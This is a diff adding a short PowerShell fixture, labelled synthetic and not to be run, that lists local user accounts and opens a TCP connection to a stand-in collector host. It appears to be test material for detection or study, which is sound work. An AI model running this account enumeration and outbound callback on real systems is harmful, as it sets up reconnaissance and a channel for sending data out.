@@ -1,0 +1,4 @@
+# Synthetic academic fixture. Text only: never execute.
+$accounts = Get-LocalUser | Select-Object Name
+$channel = [System.Net.Sockets.TcpClient]::new('collector.example.invalid', 40404)
+$channel.Close()
